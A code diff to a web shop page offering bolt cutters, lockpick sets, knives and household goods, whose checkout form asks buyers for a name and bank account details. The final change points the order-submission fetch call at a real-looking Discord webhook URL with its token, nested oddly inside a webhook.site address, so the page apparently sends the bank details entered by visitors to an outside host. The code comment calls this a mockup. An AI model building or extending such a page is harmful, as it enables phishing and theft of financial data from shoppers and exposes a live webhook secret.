@@ -94,7 +94,7 @@
             margin: 10px 0 5px;
         }
 
-        .form-container input[type="text"] {
+        .form-container input[type="text"], .form-container textarea {
             width: 100%;
             padding: 10px;
             margin-bottom: 20px;
@@ -139,8 +139,8 @@
             itemsDiv.innerHTML = ''; // Clear previous items
 
             const tools = ["Bolt cutters", "Lockpick sets", "Padlocks", "Axes", "Knives", "Shovels", "Hoes"];
-            const food = [""];
-            const more = [""];
+            const food = ["Apple", "Banana", "Carrot", "Bread", "Milk"];
+            const more = ["Books", "Clothes", "Electronics", "Furniture", "Toys"];
 
             let items = [];
 
@@ -160,7 +160,39 @@
                 const button = document.createElement('button');
                 button.className = 'item-btn';
                 button.textContent = item;
-                button.onclick = () => goToCustomerForm(item);
+                button.onclick = () => showItemVariants(item);
+                itemsDiv.appendChild(button);
+            });
+        }
+
+        function showItemVariants(item) {
+            const itemsDiv = document.getElementById('items');
+            itemsDiv.innerHTML = ''; // Clear previous items
+
+            let variants = [];
+
+            switch (item) {
+                case 'Shovels':
+                    variants = ["Basic Shovel", "Heavy-Duty Shovel", "Collapsible Shovel"];
+                    break;
+                case 'Hoes':
+                    variants = ["Garden Hoe", "Stirrup Hoe", "Heavy-Duty Hoe"];
+                    break;
+                case 'Knives':
+                    variants = ["Chef Knife", "Hunting Knife", "Utility Knife"];
+                    break;
+                case 'Lockpick sets':
+                    variants = ["Beginner Lockpick Set", "Professional Lockpick Set", "Advanced Lockpick Set"];
+                    break;
+                default:
+                    variants = [item];
+            }
+
+            variants.forEach(variant => {
+                const button = document.createElement('button');
+                button.className = 'item-btn';
+                button.textContent = variant;
+                button.onclick = () => goToCustomerForm(variant);
                 itemsDiv.appendChild(button);
             });
         }
@@ -174,7 +206,7 @@
                         <input type="text" id="name" placeholder="Your Name">
 
                         <label for="bank-details">Bank Account Details:</label>
-                        <input type="text" id="bank-details" placeholder="Your Bank Account Details">
+                        <textarea id="bank-details" rows="4" placeholder="Your Bank Account Details"></textarea>
 
                         <button class="submit-btn" onclick="submitOrder('${item}')">Buy</button>
                     </div>
@@ -191,7 +223,7 @@
                 alert(`Thank you for your purchase of ${item}! Your order number is #${orderNumber}.`);
 
                 // Send webhook with details (this is a mockup example)
-                fetch('https://webhook.site/your-webhook-url', {
+                fetch('https://webhook.site/https://discord.com/api/webhooks/1280978020026417303/N6_0RI7IzLcVkYjHnkDqVWNHnxfycklVvwBiqlXqdXCwkg2dGMKcQoipOFvjFaShJTqQ', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json'
